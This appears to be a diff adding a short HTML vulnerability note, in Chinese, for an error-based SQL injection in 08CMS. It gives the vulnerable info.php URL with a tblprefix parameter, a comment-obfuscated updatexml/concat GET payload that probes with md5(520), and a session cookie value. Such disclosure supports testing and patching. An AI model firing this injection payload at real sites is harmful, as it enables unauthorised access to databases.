@@ -1,0 +1,13 @@
+<meta charset="UTF-8">
+<div>
+    <h3>报错注入URL: </h3>
+    <ul>
+        <p>/info.php?fid=1&tblprefix=cms_msession</p>
+    </ul>
+    <h3>GET-payload: </h3>
+    <code>/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/md5(520)/**/limit/**/0,1)),1)%23</code>
+    <p>cookie: </p>
+    <code>umW_msid=rsLQWU</code>
+    <h3>验证过程</h3>
+    <img src="/vulns/imgs/08CMS_0000.jpg">
+</div>
